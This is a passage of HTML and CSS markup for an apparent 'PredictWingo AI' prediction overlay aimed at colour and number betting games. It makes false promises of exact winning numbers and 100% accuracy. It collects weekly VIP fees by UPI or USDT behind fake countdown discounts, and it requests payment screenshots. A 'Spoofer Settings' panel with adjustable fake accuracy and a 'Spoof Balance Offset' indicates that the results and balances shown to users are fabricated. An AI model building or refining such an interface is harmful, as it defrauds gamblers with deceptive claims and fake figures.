    margin-bottom: 3px;
  }
  .vip-history-type {
    font-size: 11px;
    font-weight: 700;
    letter-spacing: -0.1px;
  }
  .vip-history-upi .vip-history-type {
    color: var(--upi);
  }
  .vip-history-crypto .vip-history-type {
    color: var(--crypto);
  }
  .vip-history-status {
    flex-shrink: 0;
    font-size: 8px;
    font-weight: 700;
    letter-spacing: 0.2px;
    text-transform: capitalize;
    padding: 2px 7px;
    border-radius: 50px;
  }
  .vip-history-status.status-pending {
    background: rgba(245, 166, 35, 0.12);
    color: #f5a623;
    border: 1px solid rgba(245, 166, 35, 0.25);
  }
  .vip-history-status.status-approved {
    background: rgba(16, 185, 129, 0.12);
    color: #10b981;
    border: 1px solid rgba(16, 185, 129, 0.25);
  }
  .vip-history-status.status-rejected {
    background: rgba(239, 68, 68, 0.12);
    color: #ef4444;
    border: 1px solid rgba(239, 68, 68, 0.25);
  }
  .vip-history-remark {
    margin-top: 5px;
    padding: 5px 8px;
    border-radius: 6px;
    font-size: 9px;
    font-weight: 500;
    line-height: 1.4;
    color: #ef4444;
    background: rgba(239, 68, 68, 0.08);
    border: 1px solid rgba(239, 68, 68, 0.15);
  }
  :host(.light) .vip-history-remark {
    background: rgba(239, 68, 68, 0.05);
  }
  .vip-history-ref {
    display: block;
    font-size: 9.5px;
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    color: var(--t-body);
    word-break: break-all;
    line-height: 1.3;
  }
  .vip-history-date {
    display: block;
    margin-top: 2px;
    font-size: 9px;
    color: var(--t-dim);
  }
  .vip-history-empty {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 5px;
    padding: 30px 18px;
    text-align: center;
    color: var(--t-dim);
  }
  .vip-history-empty svg {
    opacity: 0.45;
    margin-bottom: 2px;
  }
  .vip-history-empty-title {
    font-size: 11px;
    font-weight: 700;
    color: var(--t-title);
    letter-spacing: -0.1px;
  }
  .vip-history-empty-sub {
    font-size: 9.5px;
    font-weight: 500;
    color: var(--t-dim);
    line-height: 1.4;
    max-width: 200px;
  }
</style>
<div class="logo">
  <img src="/proxy-assets/logo.png?v=2" draggable="false" />
</div>
<div class="panel">
  <div class="panel-header">
    <div class="panel-title">
      <img src="/proxy-assets/logo.png?v=2" /><span
        class="brand-pw"
        id="brand-name"
        >PredictW<span class="pw-in"
          ><span class="pw-i"
            >ı<svg class="pw-star" fill="currentColor" viewBox="0 0 24 24">
              <path
                d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"
              /></svg></span
          >n<svg
            class="pw-smile"
            viewBox="0 0 20 8"
            fill="none"
            stroke="currentColor"
            stroke-width="2.5"
            stroke-linecap="round"
          >
            <path d="M2 2 Q 10 10 18 2" /></svg></span
        >go<span class="pw-tld">.in</span></span
      ><span class="ai-badge">AI</span>
    </div>
    <button class="close-btn">✕</button>
  </div>
  <div class="panel-body">
    <div class="vip-loader-overlay" id="vip-loader" style="display: none">
      <div class="scan-rings">
        <div class="scan-ring-o"></div>
        <div class="scan-ring-i"></div>
      </div>
      <span class="vip-loader-label">Generating Secure Session...</span>
    </div>
    <div class="view view-menu active">
      <div class="menu-shell">
        <div class="menu-home-card">
          <button class="menu-home-opt menu-home-pro" id="btn-pro">
            <div class="menu-home-icon">
              <svg viewBox="0 0 24 24">
                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" />
              </svg>
            </div>
            <div class="menu-home-body">
              <div class="menu-home-top">
                <span class="menu-home-name">Pro</span>
                <span class="card-badge badge-pro">Free</span>
              </div>
              <span class="menu-home-desc">AI-Powered Predictions</span>
            </div>
            <svg class="menu-home-arrow" viewBox="0 0 24 24">
              <path d="M9 5l7 7-7 7" />
            </svg>
          </button>
          <button class="menu-home-opt menu-home-vip" id="btn-vip">
            <div class="menu-home-icon">
              <svg viewBox="0 0 24 24">
                <path
                  d="M5 16L3 5l5.5 5L12 4l3.5 6L21 5l-2 11H5zm-1 3h16v2H4v-2z"
                />
              </svg>
            </div>
            <div class="menu-home-body">
              <div class="menu-home-top">
                <span class="menu-home-name">VIP</span>
                <span class="card-badge badge-vip">Private</span>
              </div>
              <span class="menu-home-desc">100% Accuracy · Private</span>
            </div>
            <svg class="menu-home-arrow" viewBox="0 0 24 24">
              <path d="M9 5l7 7-7 7" />
            </svg>
          </button>
          <button class="menu-home-opt menu-home-mine" id="btn-mine">
            <div class="menu-home-icon">
              <svg viewBox="0 0 24 24">
                <path
                  d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"
                />
                <path d="M12 6L7.5 12.5h3.5v5.5l4.5-6.5h-3.5V6z" />
              </svg>
            </div>
            <div class="menu-home-body">
              <div class="menu-home-top">
                <span class="menu-home-name">Mining</span>
                <span class="card-badge badge-mine">Auto</span>
              </div>
              <span class="menu-home-desc">Energy-Based Auto-Mining</span>
            </div>
            <svg class="menu-home-arrow" viewBox="0 0 24 24">
              <path d="M9 5l7 7-7 7" />
            </svg>
          </button>
        </div>
        <div class="menu-home-foot">
          <span class="menu-home-live"
            ><span class="status-dot"></span>Live · Real-Time</span
          >
          <span class="menu-home-foot-sep">|</span>
          <button class="menu-home-tg" id="btn-status-tg" type="button">
            <svg viewBox="0 0 24 24" width="10" height="10" fill="currentColor">
              <path
                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z"
              />
            </svg>
            Telegram
          </button>
        </div>
      </div>
    </div>
    <div class="view view-tg">
      <div class="vip-header">
        <button class="back-btn" id="btn-tg-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">Join Telegram</span>
        <span class="vip-invite-pill"
          ><span class="live-pip"></span>Invite Only</span
        >
      </div>
      <div class="vip-hero-card">
        <div class="vip-tg-ring">
          <svg viewBox="0 0 24 24" width="26" height="26" fill="white">
            <path
              d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z"
            />
          </svg>
        </div>
        <h3 class="vip-title">Signals. Every round.</h3>
        <p class="vip-pitch">
          Our members get the signal 15s before each game starts. No noise, no
          spam — just the edge.
        </p>
      </div>
      <div class="vip-stats">
        <div class="vip-stat">
          <span class="stat-val">95%+</span
          ><span class="stat-lbl">Hit Rate</span>
        </div>
        <div class="vip-stat">
          <span class="stat-val">20K+</span
          ><span class="stat-lbl">Members</span>
        </div>
        <div class="vip-stat">
          <span class="stat-val">Free</span><span class="stat-lbl">Always</span>
        </div>
      </div>
      <button class="vip-cta" id="btn-tg-join">
        <svg viewBox="0 0 24 24" width="15" height="15" fill="white">
          <path
            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z"
          />
        </svg>
        Open Telegram
        <svg
          class="vip-arrow"
          viewBox="0 0 24 24"
          width="14"
          height="14"
          fill="none"
          stroke="white"
          stroke-width="2.5"
          stroke-linecap="round"
          stroke-linejoin="round"
        >
          <path d="M5 12h14M13 6l6 6-6 6" />
        </svg>
      </button>
      <p class="vip-note">No Account Needed · 100% Free</p>
    </div>
    <div class="view view-vip">
      <div class="vip-header">
        <button class="back-btn" id="btn-vip-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">VIP Access</span>
        <span class="vip-invite-pill"
          ><span class="live-pip"></span>Private</span
        >
      </div>
      <div class="vip-pricing-shell">
        <div class="vip-offer-card">
          <div class="vip-balls-track" aria-hidden="true">
            <img
              src="/assets/png/ball_0-Ca74Ns3T.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_1-DFUEzKvm.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_2-BA1HkQbr.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_3-CSGWgLyY.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_4-CU90k0Z5.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_5-DD5VBkEF.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_6-CRRe003w.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_7-Cf2z_aqK.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_8-BWd7rcUJ.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_9-DDw5YEZU.png"
              class="vip-ball"
              alt=""
            />
          </div>
          <div class="vip-flash-strip">
            <div class="vip-flash-copy">
              <span class="vip-flash-badge">Flash Drop</span>
              <span class="vip-flash-saving">Save ₹900 today</span>
            </div>
            <div class="vip-flash-clock">
              <span>Ends in</span>
              <strong data-vip-flash-timer>02:00:00</strong>
            </div>
          </div>
          <div class="vip-perks">
            <div class="vip-perk-item">
              <svg class="vip-perk-mark" viewBox="0 0 16 16">
                <path d="M3.5 8.2l2.8 2.8 6.2-6.4" />
              </svg>
              <div class="vip-perk-content">
                <span class="vip-perk-title">Get Number Prediction</span>
                <span class="vip-perk-desc"
                  >Get exact winning number before result</span
                >
              </div>
              <svg class="vip-perk-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </div>
            <div class="vip-perk-item">
              <svg class="vip-perk-mark" viewBox="0 0 16 16">
                <path d="M3.5 8.2l2.8 2.8 6.2-6.4" />
              </svg>
              <div class="vip-perk-content">
                <span class="vip-perk-title">100% Accuracy Guaranteed</span>
                <span class="vip-perk-desc"
                  >Every prediction verified with past results</span
                >
              </div>
              <svg class="vip-perk-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </div>
            <div class="vip-perk-item">
              <svg class="vip-perk-mark" viewBox="0 0 16 16">
                <path d="M3.5 8.2l2.8 2.8 6.2-6.4" />
              </svg>
              <div class="vip-perk-content">
                <span class="vip-perk-title">Number + Color + Big/Small</span>
                <span class="vip-perk-desc"
                  >All three markets covered in one signal</span
                >
              </div>
              <svg class="vip-perk-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </div>
            <div class="vip-perk-item">
              <svg class="vip-perk-mark" viewBox="0 0 16 16">
                <path d="M3.5 8.2l2.8 2.8 6.2-6.4" />
              </svg>
              <div class="vip-perk-content">
                <span class="vip-perk-title">Auto-Mining Built In</span>
                <span class="vip-perk-desc"
                  >Set it once, earn while you sleep</span
                >
              </div>
              <svg class="vip-perk-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </div>
          </div>
          <div class="vip-offer-foot">
            <div class="vip-price-line">
              <span class="vip-price-old">₹2,399</span
              ><span class="vip-price-amt">₹1,499</span
              ><span class="vip-price-unit">/ week</span>
            </div>
            <p class="vip-price-meta">UPI flash price · Crypto stays $24</p>
            <button class="vip-checkout-btn" id="btn-vip-checkout">
              Join Now
            </button>
          </div>
        </div>
      </div>
    </div>
    <div class="view view-vip-pay">
      <div class="vip-header">
        <button class="back-btn" id="btn-vip-pay-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">Select Payment</span>
        <button class="vip-hist-btn" id="btn-vip-history" aria-label="History">
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <circle cx="12" cy="12" r="10" />
            <polyline points="12 6 12 12 16 14" />
          </svg>
        </button>
      </div>
      <div class="vip-pay-shell">
        <div class="vip-flash-strip vip-flash-strip-pay">
          <div class="vip-flash-copy">
            <span class="vip-flash-badge">Limited Drop</span>
            <span class="vip-flash-saving">₹900 instant saving</span>
          </div>
          <div class="vip-flash-clock">
            <span>Ends in</span> <strong data-vip-flash-timer>02:00:00</strong>
          </div>
        </div>
        <div class="vip-pay-card">
          <div class="vip-pay-summary">
            <span class="vip-pay-summary-lbl">UPI Flash Price</span>
            <span class="vip-pay-summary-amt"><s>₹2,399</s>₹1,499</span>
          </div>
          <div class="vip-pay-options">
            <button class="vip-pay-opt vip-pay-upi" id="btn-pay-upi">
              <div class="vip-pay-opt-icon">
                <svg viewBox="0 0 24 24">
                  <path
                    d="M21 7H3a2 2 0 00-2 2v10a2 2 0 002 2h18a2 2 0 002-2V9a2 2 0 00-2-2zm0 2v2h-3a2 2 0 100 4h3v2H3V9h18zm-5 2h1v2h-1v-2z"
                  />
                </svg>
              </div>
              <div class="vip-pay-opt-body">
                <div class="vip-pay-opt-top">
                  <span class="vip-pay-opt-name">UPI</span>
                  <span class="card-badge badge-upi">Instant</span>
                </div>
                <span class="vip-pay-opt-desc">GPay, PhonePe, Paytm, QR</span>
              </div>
              <svg class="vip-pay-opt-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </button>
            <button class="vip-pay-opt vip-pay-crypto" id="btn-pay-crypto">
              <div class="vip-pay-opt-icon">
                <svg viewBox="0 0 24 24">
                  <path
                    d="M12 2l9 5.5v9L12 22l-9-5.5v-9L12 2zm0 2.2L5.5 8.5 12 12.8l6.5-4.3L12 4.2zm7.5 6.1L12 14.6 4.5 10.3v6.7L12 20.8l7.5-3.8v-6.7z"
                  />
                </svg>
              </div>
              <div class="vip-pay-opt-body">
                <div class="vip-pay-opt-top">
                  <span class="vip-pay-opt-name">Crypto</span>
                  <span class="card-badge badge-crypto">USDT/TRX</span>
                </div>
                <span class="vip-pay-opt-desc">Fixed price · $24 USDT</span>
              </div>
              <svg class="vip-pay-opt-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </button>
          </div>
        </div>
        <div class="vip-pay-foot">
          <span class="vip-pay-trust"
            ><span class="status-dot"></span>Safe Payments</span
          >
          <span class="vip-pay-trust-sep">·</span> <span>Secure Checkout</span>
        </div>
      </div>
    </div>
    <div class="view view-vip-checkout">
      <div class="vip-header">
        <button class="back-btn" id="btn-vip-checkout-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label" id="vip-checkout-title">Payment</span>
      </div>
      <div class="vip-checkout-shell">
        <div class="vip-checkout-card">
          <div class="vip-checkout-head">
            <div class="vip-checkout-stat">
              <span class="vip-checkout-stat-lbl">Offer Timer</span>
              <span class="vip-checkout-stat-val" id="vip-checkout-timer"
                >02:00:00</span
              >
            </div>
            <div class="vip-checkout-stat vip-checkout-stat-amt">
              <span class="vip-checkout-stat-lbl">Amount</span>
              <span class="vip-checkout-stat-val" id="vip-checkout-amount"
                >₹1,499</span
              >
            </div>
          </div>
          <div class="vip-checkout-qr">
            <div class="vip-checkout-qr-frame">
              <img id="vip-qr-img" src="" alt="Scan to pay" />
            </div>
            <p class="vip-checkout-qr-hint">Scan With Your Payment App</p>
          </div>
          <div class="vip-checkout-detail-row">
            <span class="vip-detail-lbl">Order ID</span>
            <span class="vip-detail-val" id="vip-order-id">—</span>
          </div>
          <div class="vip-checkout-payto">
            <div class="vip-checkout-payto-hdr">
              <span class="vip-detail-lbl" id="vip-address-lbl">UPI ID</span>
              <span
                class="vip-network-lbl"
                id="vip-network-lbl"
                style="display: none"
                >TRC20</span
              >
            </div>
            <div class="vip-checkout-payto-row">
              <span class="vip-address-val" id="vip-address-val">—</span>
              <button
                type="button"
                class="vip-copy-btn"
                id="btn-vip-copy"
                aria-label="Copy"
              >
                Copy
              </button>
            </div>
            <button
              type="button"
              id="vip-upi-hint"
              class="vip-upi-hint"
              style="display: none"
            >
              <svg
                viewBox="0 0 24 24"
                width="12"
                height="12"
                fill="none"
                stroke="currentColor"
                stroke-width="2.5"
              >
                <path
                  d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.3"
                />
              </svg>
              Change UPI ID
            </button>
          </div>
          <div class="vip-checkout-foot">
            <button class="vip-checkout-btn" id="btn-vip-confirm">
              Confirm Payment
            </button>
          </div>
        </div>
        <div class="vip-pay-foot">
          <span class="vip-pay-trust"
            ><span class="status-dot"></span>Safe payments</span
          >
          <span class="vip-pay-trust-sep">·</span> <span>Secure checkout</span>
        </div>
      </div>
    </div>
    <div class="view view-vip-submit">
      <div class="vip-header">
        <button class="back-btn" id="btn-vip-submit-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">Submit Proof</span>
      </div>
      <div class="vip-checkout-shell">
        <div class="vip-checkout-card">
          <div class="vip-proof-section">
            <label class="vip-proof-lbl" for="vip-utr-input"
              >UTR / Transaction Hash</label
            >
            <input
              type="text"
              id="vip-utr-input"
              class="vip-proof-input"
              placeholder="12-digit UTR or TxHash"
              autocomplete="off"
              spellcheck="false"
            />
          </div>
          <div class="vip-proof-section">
            <label class="vip-proof-lbl">Payment Screenshot</label>
            <div class="vip-file-zone" id="vip-file-zone">
              <input type="file" id="vip-file-input" accept="image/*" hidden />
              <div class="vip-file-placeholder" id="vip-file-placeholder">
                <svg
                  viewBox="0 0 24 24"
                  width="20"
                  height="20"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
                  <circle cx="8.5" cy="8.5" r="1.5"></circle>
                  <polyline points="21 15 16 10 5 21"></polyline>
                </svg>
                <span>Tap to Upload</span>
              </div>
              <img
                id="vip-file-preview"
                class="vip-file-preview"
                src=""
                alt="Payment screenshot preview"
              />
              <button
                type="button"
                class="vip-file-remove"
                id="btn-vip-file-remove"
                aria-label="Remove screenshot"
              >
                &times;
              </button>
            </div>
          </div>
          <div class="vip-checkout-foot">
            <button class="vip-checkout-btn" id="btn-vip-submit-proof">
              Submit Proof
            </button>
          </div>
        </div>
        <div class="vip-pay-foot">
          <span class="vip-pay-trust"
            ><span class="status-dot"></span>Safe payments</span
          >
          <span class="vip-pay-trust-sep">·</span> <span>Secure checkout</span>
        </div>
      </div>
    </div>
    <div class="view view-vip-history">
      <div class="vip-header">
        <button class="back-btn" id="btn-vip-history-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">Order History</span>
      </div>
      <div class="vip-history-shell">
        <div class="vip-history-card">
          <div class="vip-history-list" id="vip-history-list"></div>
        </div>
        <div class="vip-pay-foot">
          <span class="vip-pay-trust"
            ><span class="status-dot"></span>Safe payments</span
          >
          <span class="vip-pay-trust-sep">·</span> <span>Secure checkout</span>
        </div>
      </div>
    </div>
    <div class="view view-settings">
      <div class="pro-top">
        <button class="back-btn" id="btn-settings-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="settings-header-label">Spoofer Settings</span>
      </div>
      <div class="spoofer-card">
        <div class="spoofer-section">
          <label class="spoofer-label">Prediction Accuracy</label>
          <div class="spoofer-row">
            <input
              type="range"
              id="spoof-acc-range"
              min="0"
              max="100"
              step="1"
              value="70"
            />
            <input
              type="number"
              id="spoof-acc-num"
              min="0"
              max="100"
              value="70"
            />
            <span class="spoofer-unit">%</span>
          </div>
        </div>
        <div class="spoofer-section">
          <label class="spoofer-label">Spoof Balance Offset</label>
          <div class="spoofer-row">
            <input
              type="number"
              id="spoof-bal"
              min="0"
              step="100"
              value="5000"
            />
            <span class="spoofer-unit">₹</span>
          </div>
        </div>
        <button class="spoofer-reset" id="btn-spoof-reset">
          Reset Defaults
        </button>
      </div>
      <div class="spoofer-card" style="margin-top: 10px">
        <label class="spoofer-label">Withdrawal Requests</label>
        <div id="spoof-withdrawals-list"></div>
      </div>
    </div>
    <div class="view view-pro">
      <div class="pro-top">
        <button class="back-btn" id="btn-pro-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <div class="pro-gameinfo">
          <div class="pro-gameinfo-row">
            <span class="pro-game-name" id="pro-mode">—</span
            ><span class="pro-live-badge"
              ><span class="live-pip"></span>Live</span
            >
          </div>
          <span class="pro-round" id="pro-period">—</span>
        </div>
      </div>
      <div class="pro-timer-wrap" id="pro-timer-wrap">
        <div class="pro-timer-label">Time Remaining</div>
        <span class="pro-timer" id="pro-timer">00:00</span>
      </div>
      <div class="pro-card" id="pro-card">
        <div class="pro-scanning" id="pro-waiting">
          <div class="scan-rings">
            <div class="scan-ring-o"></div>
            <div class="scan-ring-i"></div>
          </div>
          <span class="scan-label" id="scan-lbl"
            >Scanning<span class="s-dot"></span><span class="s-dot"></span
            ><span class="s-dot"></span
          ></span>
        </div>
        <div class="pro-prediction" id="pro-prediction" style="display: none">
          <div class="streak-badge" id="streak-badge">
            <span>🔥</span><span id="streak-text">—</span>
          </div>
          <div class="pred-hero">
            <div class="pred-glow" id="pred-glow"></div>
            <div class="pred-ball" id="hero-ball"></div>
          </div>
          <div class="pred-tags">
            <span class="pred-size" id="pred-pill">Big</span
            ><span class="pred-color" id="pred-color">Red</span>
          </div>
          <div class="pred-conf">
            <div class="conf-track">
              <div class="conf-fill" id="conf-fill"></div>
            </div>
            <span class="conf-pct" id="conf-pct">0%</span>
          </div>
          <div class="pred-history" id="pred-history">
            <span class="hist-label">Recent</span>
          </div>
        </div>
      </div>
    </div>
    <div class="view view-mining">
      <div class="vip-header">
        <button class="back-btn" id="btn-mining-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">Auto Mining</span>
        <button
          class="mine-hist-btn"
          id="btn-mining-history"
          aria-label="History"
        >
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <circle cx="12" cy="12" r="10" />
            <polyline points="12 6 12 12 16 14" />
          </svg>
        </button>
        <span class="mine-energy-pill" style="display: none"
          ><svg class="energy-svg" viewBox="0 0 24 24">
            <path d="M12 2L4.5 14h6v8L18 10h-6V2z" /></svg
          ><span id="mine-energy-count">10</span></span
        >
      </div>
      <div class="mine-shell">
        <div class="mine-card">
          <div class="mine-row">
            <span class="mine-lbl"
              ><svg
                class="mine-lbl-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <rect x="2" y="6" width="20" height="12" rx="2" />
                <path d="M22 10H2" />
                <circle cx="17" cy="14" r="1.5" /></svg
              >Available Balance</span
            >
            <span class="mine-val" id="mine-current-bal">₹5,000.00</span>
          </div>
          <div class="mine-row">
            <span class="mine-lbl"
              ><svg
                class="mine-lbl-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <circle cx="12" cy="12" r="10" />
                <circle cx="12" cy="12" r="6" />
                <circle cx="12" cy="12" r="2" /></svg
              >Target Balance</span
            >
            <div class="mine-input-wrap">
              <span class="mine-symbol">₹</span>
              <input
                type="number"
                id="mine-target-goal"
                class="mine-input"
                min="100"
                step="100"
                value="10000"
                placeholder="10000"
              />
            </div>
          </div>
          <div class="mine-row">
            <span class="mine-lbl"
              ><svg
                class="mine-lbl-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path
                  d="M12 22s-8-4.5-8-11.8A8 8 0 0 1 12 2a8 8 0 0 1 8 8.2c0 7.3-8 11.8-8 11.8z"
                />
                <circle cx="12" cy="10" r="3" /></svg
              >Stop Balance</span
            >
            <div class="mine-input-wrap">
              <span class="mine-symbol">₹</span>
              <input
                type="number"
                id="mine-stop-loss"
                class="mine-input"
                min="0"
                step="100"
                value=""
                placeholder="No Limit"
              />
            </div>
          </div>
          <div class="mine-terminal-section">
            <div class="mining-terminal" id="mine-console">
              <div class="console-line active">System ready to mine...</div>
            </div>
          </div>
          <div class="mine-card-foot">
            <button class="mine-cta" id="btn-mining-start">
              Start Mining · 1 Energy
            </button>
            <p class="mine-note">Stops Automatically at Target Balance</p>
          </div>
        </div>
      </div>
      <div
        class="mining-energy-modal"
        id="mining-energy-modal"
        style="display: none"
      >
        <button
          class="energy-modal-close"
          id="btn-energy-close"
          aria-label="Close"
        >
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2.5"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <path d="M18 6L6 18M6 6l12 12" />
          </svg>
        </button>
        <div class="energy-modal-content">
          <div class="energy-modal-icon">
            <svg
              viewBox="0 0 64 64"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <rect
                x="6"
                y="18"
                width="44"
                height="28"
                rx="6"
                stroke="currentColor"
                stroke-width="3.5"
              />
              <rect
                x="50"
                y="26"
                width="8"
                height="12"
                rx="3"
                fill="currentColor"
                opacity="0.3"
              />
              <rect
                x="12"
                y="24"
                width="8"
                height="16"
                rx="2"
                fill="currentColor"
                opacity="0.2"
              />
            </svg>
          </div>
          <div class="energy-modal-title">You're Out of Energy</div>
          <div class="energy-modal-desc">
            Each mining session uses one energy unit. Get a free boost below to
            start right away.
          </div>
          <div class="energy-modal-actions">
            <button class="energy-btn-primary" id="btn-energy-boost">
              Get Free Energy
            </button>
            <button class="energy-btn-secondary" id="btn-energy-topup">
              Buy More Energy
            </button>
          </div>
        </div>
      </div>
      <div
        class="mining-history-modal"
        id="mining-history-modal"
        style="display: none"
      >
        <button
          class="energy-modal-close"
          id="btn-history-close"
          aria-label="Close"
        >
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2.5"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <path d="M18 6L6 18M6 6l12 12" />
          </svg>
        </button>
        <div class="history-modal-content">
          <div class="history-modal-title">Mining History</div>
          <div class="history-list" id="mining-history-list"></div>
          <button class="history-clear-btn" id="btn-history-clear">
            Clear History
          </button>
        </div>
      </div>
    </div>
  </div>
  <div class="gate-view">
    <div class="gate-icon">
      <svg
        width="20"
        height="20"
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        stroke-width="2.5"
        stroke-linecap="round"
        stroke-linejoin="round"
      >
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
      </svg>
    </div>
    <h3 class="gate-title">Predictions Locked</h3>
    <div class="gate-bal-wrap">
      <span class="gate-balance" id="gate-bal">₹0.00</span>
    </div>
    <p class="gate-desc">
      Minimum ₹500 balance required to<br />access real-time predictions.
    </p>
    <div class="gate-actions">
      <button class="gate-btn btn-deposit">Deposit Now</button>
      <button class="gate-btn btn-telegram">Join Telegram</button>
    </div>
  </div>
</div>
<div class="bonus-view" id="bonus-view">
  <div class="bonus-hdr">
    <button class="bonus-back-btn" id="btn-bonus-back">
      <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
    </button>
    <span class="bonus-ttl">Referral Bonus</span>
  </div>
  <div class="bonus-scroll">
    <div class="bonus-hero">
      <div class="bonus-hero-icon">💰</div>
